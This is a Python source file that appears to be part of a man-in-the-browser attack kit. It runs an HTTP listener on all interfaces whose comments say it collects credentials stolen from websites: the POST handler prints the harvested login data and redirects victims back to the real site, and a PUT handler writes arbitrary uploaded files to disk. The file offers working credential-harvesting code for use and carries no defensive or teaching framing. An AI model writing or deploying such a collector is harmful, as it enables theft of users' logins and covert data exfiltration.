import socket
import urllib.request
from urllib.parse import urlparse
from urllib.request import urlopen
import queue
import os 
import sys
import paramiko
import threading
import ctypes
import time
import http.cookiejar
import win32com.client #Use the following command to install this module: => python -m pip install pywin32
from netaddr import IPNetwork, IPAddress #Use the following command to install this module: => pip install netaddr to install this
from html.parser import HTMLParser
import http.server
import socketserver
WindowsClassObject = '{9BA05972-F6AB-11CF-A442-00A0C90A8F39}' #The class ID for Internet Explorer

#THE ADDRESS FOR THIS WEB SERVER: =>  localhost:8080

#When running this program, enter it in the cmd as: =>  python3 MitB.py HTTPServer.py
#We need this server to store all credentials stolen from websites 
class CredRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        creds = self.rfile.read(content_length).decode('utf-8')
        print(creds)
        site = self.path[1:]
        self.send_response(301)
        self.send_header('Location', urllib.request.unquote(site))
        self.end_headers()

    def do_PUT(self):
        path = self.translate_path(self.path)
        if path.endswith('/'):
            self.send_response(405, "Method Not Allowed")
            self.wfile.write("PUT not allowed on a directory\n".encode())
            return
        else:
            try:
                os.makedirs(os.path.dirname(path))
            except FileExistsError: pass
            length = int(self.headers['Content-Length'])
            with open(path, 'wb') as f:
                f.write(self.rfile.read(length))
            self.send_response(201, "Created")


#Leave the TCPServer IP address '0.0.0.0' or blank '' to listen to all IP addresses
os.system("dir > dir.txt")
server = socketserver.TCPServer(('0.0.0.0', 8080), CredRequestHandler)
server.serve_forever()


